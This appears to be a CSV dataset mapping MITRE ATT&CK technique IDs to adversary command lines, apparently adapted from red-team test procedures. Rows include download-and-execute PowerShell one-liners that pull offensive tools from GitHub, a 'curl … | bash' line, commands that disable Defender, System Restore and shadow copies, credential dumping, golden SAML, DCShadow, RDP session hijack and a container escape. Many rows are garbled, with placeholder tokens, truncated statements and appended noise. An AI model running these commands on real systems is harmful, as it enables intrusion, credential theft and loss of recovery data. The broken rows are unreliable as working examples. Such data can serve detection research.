mitre_id,command
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_15458 write-host ""end of federation configuration."""
T1033,"$tokenset  =  @{  u  =  [char[]]'abcdefghijklmnopqrstuvwxyz'  n  =  [char[]]'0123456789'  }  $upper  =  get-random  -count  5  -inputobject  $tokenset.u  $number  =  get-random  -count  5  -inputobject  $tokenset.n  $stringset  =  $upper  +  $number  $rad  =  (get-random  -count  5  -inputobject  $stringset)  -join  ''  $file  =  ""rad""  +  $rad  +  "".tmp""  whoami.exe  \all  >>  var_74851\$file"
T1136,useradd -m -n -r -s /bin/bash -c evil_account #{username}
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_103"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1202,#  copy  command  to  clipboard  set-clipboard  -value  'var_439')
T1012,reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated# run_3233
T1497,"if  [  ""$(sysctl  -n  hw.model  |  grep  -v  'mac')""  !=  """"  ];  then  echo  'virtualization  environment  detected';  fi;"
T1046,sudo nmap -ss var_28346
T1548,set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name promptonsecuredesktop -value 0 -type dword -force
T1135,"invoke-expression 'cmd \c start powershell -command { cmd \c ""var_91938; start-sleep 90; stop-process -name ""snaffler""'"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_851"" net start sesshijack"
T1572,nohup var_677 >\dev\null 2>&1 &
T1548,cp #{payload} /tmp/hello.c chown root /tmp/hello.c make /tmp/hello chown root /tmp/hello chmod u+s /tmp/hello /tmp/hello# run_8408
T1580,aws ec2 describe-security-groups --profile var_5767
T1615,get-gpo -domain $env:userdnsdomain var_71161
T1001,"cd  ""pathtoatomicsfolder\externalpayloads\""  import-module  .\extract-invoke-psimage.ps1  $extractedscript=extract-invoke-psimage  -image  ""var_70029  $scriptpath  =  ""$home\textextraction.ps1""  $textmatches  -join  ''  |  set-content  -path  $scriptpath  .  ""$home\textextraction.ps1"""
T1485,"if (-not (test-path ""var_267"""
T1611,"echo ""current user: var_6684"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1057,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\#{pchunter64_exe}""# run_7844"
T1530,"$storage_account_objects = import-csv -path ""var_73146"
T1018,arp -a
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-domain-length.ps1 -domain var_2757"
T1090,"invoke-expression 'cmd \c start powershell -command {cmd \c ""var_27450' sleep -s 60 stop-process -name ""tor"" | out-null"
T1222,touch  var_511
T1496,yes > \dev\null# run_6982
T1221,"start ""var_748"""
T1505,"install-transportagent  -name  var_702  get-transportagent  |  format-list  name,enabled"
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_9402"
T1053,"systemd-run --unit=atomic-red-team --on-calendar '*:0\1' \bin\sh -c 'echo ""$(date) $(whoami)"" >>\tmp\log'# run_6733"
T1564,net user $ atomic123! /add /active:yes# run_2182
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}> /dev/null 2>&1 # id_37
T1140,echo var_3091 | b64decode -r | sh
T1496,yes  >  \dev\null> /dev/null 2>&1 # id_68
T1123,sh var_77571
T1059,"powershell.exe ""iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\windows\system32\cmd.exe'"""
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-beacon.ps1 -domain var_99499"
T1132,echo  -n  111-11-1111  |  base64  curl  -xpost  var_540
T1219,start-process var_739
T1124,date# run_2947
T1580,"export aws_region=var_55431 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1041,if(-not (test-path var_571 -method post -body $filecontent -disablekeepalive
T1543,"stop-service -name ""var_349"" -erroraction silentlycontinue | out-null"
T1490,"reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f"
T1134,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\tokenmanipulation\get-winlogontokensystem.ps1');get-winlogontokensystem# run_5229
T1219,start-process #{ultravnc_viewer_path}> /dev/null 2>&1 # id_46
T1571,test-netconnection -computername var_411
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpwatson.ps1') invoke-watson> /dev/null 2>&1 # id_21
T1016,test-netconnection -commontcpport smb -computername #{target}# run_5758
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_833"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1619,"try{$response  =  invoke-webrequest  ""https:\\var_95930  -append"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }# run_8119"
T1036,"copy %systemroot%\system32\wscript.exe %appdata%\svchost.exe \y cmd.exe \c %appdata%\svchost.exe ""pathtoatomicsfolder\..\externalpayloads\t1036.003\src\t1036.003_masquerading.vbs""> /dev/null 2>&1 # id_10"
T1053,"kubectl  run  var_194  &&  at  -l"""
T1069,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); find-localadminaccess -verbose
T1071,"set-location  ""pathtoatomicsfolder""  .\t1071.004\src\t1071-dns-beacon.ps1  -domain  var_911"
T1136,pw useradd var_310 -s \usr\sbin\nologin -d \nonexistent -c evil_account
T1564,start-process var_227
T1110,useradd  -g  wheel  -s  \bin\bash  -p  $(openssl  passwd  -1  password123)  art  su  art  cd  \tmp  curl  -s  var_62611  |bash
T1007,net.exe  start  >>  var_202
T1555,"vaultcmd \listcreds:""web credentials"" \all"
T1027,send-mailmessage -from var_333
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh> /dev/null 2>&1 # id_58
T1049,sockstat -4 sockstat -6 2>/dev/null || true sockstat -l 2>/dev/null || true> /dev/null 2>&1 # id_39
T1098,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $sp = get-azadserviceprincipal | where-object {$_.displayname -eq ""#{service_principal_name}""} if ($sp -eq $null) { write-warning ""service principal not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $sp.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""service principal $($sp.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"""
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_220"")"
T1567,new-item var_39618:test -v
T1573,$server_ip = var_814
T1095,"cmd \c ""var_33562"
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_3492"
T1572,nohup var_27250 >\dev\null 2>&1 &
T1619,"try{$response  =  invoke-webrequest  ""https:\\var_590  -append"
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh> /dev/null 2>&1 # id_63
T1529,shutdown -r var_40963
T1573,$server_ip = var_267
T1562,"set-itemproperty ""hklm:\software\policies\microsoft\windows defender"" -name disableantispyware -value 1"
T1569,psexec.py  'var_976'
T1020,"$filename = ""var_277"
T1049,$syntaxlist  =  var_14849
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_1690
T1484,"new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimedc  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimeoffsetdc  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtime  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimeoffset  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  enablesmartscreen  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  shellsmartscreenlevel  -force"
T1113,screencapture var_56652
T1491,"$url  =  ""var_72747"
T1580,"export aws_region=var_190 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1124,net  time  \\var_92566  w32tm  \tz
T1197,start-bitstransfer  -priority  foreground  -source  var_743
T1090,export var_976
T1654,wevtutil enum-logs# run_8054
T1490,sc sdset vss d:(d;;ga;;;nu)(d;;ga;;;wd)(d;;ga;;;an)s:(au;fa;ga;;;wd)(au;oiiofa;ga;;;wd)
T1555,python3 #{lazagne_path}/lazagne.py #{specific_module} >> #{output_file}> /dev/null 2>&1 # id_62
T1564,"echo cmd \c echo ""shell code execution.""> var_452) do %i"
T1082,"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""droplet\|hvm\|virtualbox\|vmware""; fi if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""xen\|bochs\|qemu""; fi if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""xen\|kvm\|microsoft""; fi> /dev/null 2>&1 # id_87"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.56827\ubolite_2024.11.25.39660.chromium.mv3.zip"" set-location ""var_21396\extension\"" -passthru"
T1007,net.exe  start  >>  var_23814
T1041,"$dnsserver  =  ""var_294"
T1562,ufw logging off
T1562,sudo launchctl unload /library/launchdaemons/com.opendns.osx.roamingclientconfigupdater.plist
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_972 write-host ""end of golden saml"""
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached> /dev/null 2>&1 # id_31"
T1202,# copy command to clipboard set-clipboard -value 'var_692')
T1529,shutdown /s /t #{timeout}
T1491,"$url = ""var_494"
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\var_862 \ticket:ticket.kirbi \ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge"
T1082,"cscript ""var_984"""
T1496,yes  >  \dev\null# run_7793
T1569,launchctl submit -l var_830
T1129,"var_45737"""
T1197,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr# run_1158"
T1037,sudo cp var_502 \tmp\t1037_005_daemon.plist sudo \library\startupitems\atomic.sh start
T1033,set  file=var_496\user_info_%random%.tmp  echo  username:  %username%  >  %file%  echo  user  domain:  %userdomain%  >>  %file%  net  users  >>  %file%  query  user  >>  %file%
T1553,regsvr32.exe  var_272
T1547,"$target = ""c:\windows\system32\calc.exe"" $shortcutlocation = ""$home\appdata\roaming\microsoft\windows\start menu\programs\startup\calc_exe.lnk"" $wscriptshell = new-object -comobject wscript.shell $create = $wscriptshell.createshortcut($shortcutlocation) $create.targetpath = $target $create.save()"
T1125,reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestart  \t  reg_binary  \d  a273b6f07104d601  \f  reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestop  \t  reg_binary  \d  96ef514b7204d601  \f# run_2131
